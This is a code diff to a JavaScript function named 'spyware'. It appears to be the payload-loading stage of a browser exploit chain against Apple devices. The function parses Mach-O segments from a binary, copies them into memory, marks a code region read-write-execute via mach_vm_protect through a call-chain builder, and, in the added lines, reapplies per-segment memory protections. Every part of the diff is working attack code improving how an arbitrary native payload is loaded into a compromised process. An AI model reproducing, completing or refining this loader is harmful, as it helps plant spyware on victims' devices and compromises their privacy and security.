@@ -423,7 +423,9 @@ function spyware(stage1, memory, binary)
             if(!(filesize.hi() == 0 && filesize.lo() == 0))
             {
                 var vmstart = binary.readInt64(off + 0x18);
-                var vmend = Add(vmstart, binary.readInt64(off + 0x20));
+                var vmsize = binary.readInt64(off + 0x20);
+                var vmend = Add(vmstart, vmsize);
+
                 if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() <= pstart.lo()))
                 {
                     pstart = vmstart;
@@ -459,16 +461,19 @@ function spyware(stage1, memory, binary)
                 var vmaddr   = binary.readInt64(off + 0x18);
                 var vmsize   = binary.readInt64(off + 0x20);
                 var fileoff  = binary.readInt64(off + 0x28);
+                var prots    = binary.readInt64(off + 0x38); // lo=init_prot, hi=max_prot
+
                 if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() <= filesize.lo()))
                 {
                     filesize = vmsize;
                 }
-                segs.push(
-                {
+                segs.push({
                     addr:    Sub(vmaddr, pstart),
                     size:    filesize,
                     fileoff: fileoff,
+                    prots:   prots,
                 });
+
                 if(fileoff.hi() != 0)
                 {
                     fail("fileoff");
@@ -477,6 +482,7 @@ function spyware(stage1, memory, binary)
                 {
                     fail("filesize");
                 }
+
                 fileoff = fileoff.lo();
                 filesize = filesize.lo();
                 payload.set(binary.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
@@ -705,8 +711,8 @@ function spyware(stage1, memory, binary)
             , mach_task_self_    // task
             , codeAddr           // addr
             , shsz               // size
-            , new Int64(0)       // max flag
-            , new Int64(7)       // prot
+            , new Int64(0)       // set maximum
+            , new Int64(7)       // prot (RWX)
         );
 
         add_call(memmove
@@ -724,6 +730,19 @@ function spyware(stage1, memory, binary)
         } else {
             fail('bi0nic (c)');
         }
+
+        segs.forEach(function(seg) {
+            if (seg.prots.hi() & 2) { // VM_PROT_WRITE
+                var addr = Add(seg.addr, codeAddr);
+                add_call(mach_vm_protect
+                    , mach_task_self_    // task
+                    , addr               // addr
+                    , seg.size           // size
+                    , new Int64(0)       // set maximum
+                    , new Int64(0x13)    // prot (RW- | COPY)
+                );
+            }
+        })
     }
 
     add_call(usleep
